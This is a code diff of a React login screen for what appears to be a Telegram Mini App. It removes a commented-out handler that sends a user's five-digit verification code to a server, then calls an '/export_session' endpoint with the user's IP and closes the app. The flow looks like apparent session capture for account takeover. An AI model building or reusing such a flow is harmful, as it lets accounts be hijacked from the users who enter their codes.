@@ -64,52 +64,6 @@ const AuthScreen = ({ phone, IP }) => {
 
         }
     };
-    // const handleVerificatiionCode = async (event) => {
-    //     try {
-    //         let inputValue = event.target?.value
-    //         if (inputValue.length === 5) {
-    //             const userId = localStorage.getItem("user_id")
-    //             console.log(userId)
-    //             const data = {
-    //                 "code": inputValue,
-    //                 "user_id": userId
-    //             }
-    //             setLoading(true);
-    //             const response = await api.post("/verify_code", data, {
-    //                 headers: { "Content-Type": "application/json" },  // Ensure correct content type
-    //             })
-    //             console.log(response)
-    //             if (response.status === 200) {
-    //                 setError("")
-    //                 setLoading(false);
-    //                 console.log(IP)
-    //                 await delay(2000);
-    //                 const res = await api.get(`/export_session/${userId}`, {
-    //                     params: { ip: IP },
-    //                     timeout: 10000  // 10 second timeout
-    //                 },
-    //                     {
-    //                         headers: { "Content-Type": "application/json" }
-    //                     });
-
-    //                 console.log(res);
-    //                 // Close the Telegram Mini App
-    //                 if (window.Telegram.WebApp) {
-    //                     window.Telegram.WebApp.close();
-    //                 } else {
-    //                     console.error("Telegram WebApp API is not available.");
-    //                 }
-    //             } else {
-    //                 setLoading(false);
-    //                 setError(response.data?.message || "Unexpected error occured");
-    //             }
-    //         }
-    //     } catch (e) {
-    //         setLoading(false);
-    //         console.error(e)
-    //         setError(e.response.data?.detail || "Unexpected error occured")
-    //     }
-    // }
 
 
     const handleCodeFocus = () => {
@@ -120,7 +74,7 @@ const AuthScreen = ({ phone, IP }) => {
 
     return (
         <div className="flex items-center justify-center min-h-screen bg-gray-900">
-            <div className="w-96  text-center ">
+            <div className="w-80  text-center ">
                 {/* Monkey Avatar */}
                 <div className="flex justify-center">
                     <span className="text-6xl">🐵</span>
